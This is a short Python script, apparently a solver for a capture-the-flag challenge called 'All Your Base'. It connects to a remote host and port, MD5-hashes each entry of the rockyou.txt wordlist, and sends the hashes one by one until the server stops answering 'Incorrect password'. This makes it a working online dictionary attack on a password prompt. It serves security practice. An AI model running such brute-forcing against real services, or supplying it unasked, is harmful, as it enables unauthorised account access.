#!/bin/python3

import argparse
import socket
import hashlib

def receiveUntil(sock, ending=":"):
    data = ""    
    while True:
        chunk = sock.recv(1).decode()
        data += chunk        
        if chunk in ending:
            return data
        if len(data) > 100:
            return data
            

# 'argparse' is a very useful library for building python tools that are easy
# to use from the command line.  It greatly simplifies the input validation
# and "usage" prompts which really help when trying to debug your own code.
parser = argparse.ArgumentParser(description="Solver for 'All Your Base' challenge")
parser.add_argument("ip", help="IP (or hostname) of remote instance")
parser.add_argument("port", type=int, help="port for remote instance")
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.ip, args.port))

passwordsList = "../../Tools/rockyou.txt"
with open(passwordsList, 'r') as handle:
    for line in handle:
        # Receive prompt
        prompt = receiveUntil(sock, ":")        
        
        # Send hashed password
        password = line.strip()
        print(f"Trying: [{password}]")
        # Add + "0" because the last character gets stripped on the server side
        # The server is stripping the implied newline character "\n"
        pwHash = hashlib.md5(password.encode('utf-8')).hexdigest() + "0"
        sock.send(pwHash.encode())

        # Receive response    
        response = receiveUntil(sock, ".}")
        if "Incorrect password" in response:
            continue
        else:
            print(f"Password: {password}")
            print(f"Response: {response}")
            break
